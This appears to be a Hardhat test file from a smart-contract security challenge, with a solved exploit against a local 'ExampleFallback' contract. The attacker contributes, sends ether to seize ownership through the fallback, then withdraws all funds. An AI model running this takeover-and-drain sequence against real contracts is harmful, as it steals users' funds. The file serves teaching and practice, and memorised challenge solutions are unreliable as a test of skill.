const { ethers, network } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Example Vuln', function () {

    let deployer, attacker;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();
        const FallbackFactory = await ethers.getContractFactory('ExampleFallback', deployer);
        this.target = await FallbackFactory.deploy();
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
        // Contribute to get into whitelist
        await this.target.connect(attacker).contribute({value: some_ether});
        // Takeover the contract's owner by sending some ethers
        tx = {
            to: this.target.address,
            value: some_ether
        };
        await attacker.sendTransaction(tx);
        // Withdraw all ethers in the contract
        await this.target.connect(attacker).withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // Attacker should takeover the owner of the contract
        expect(await this.target.owner()).eq(attacker.address);
    });
});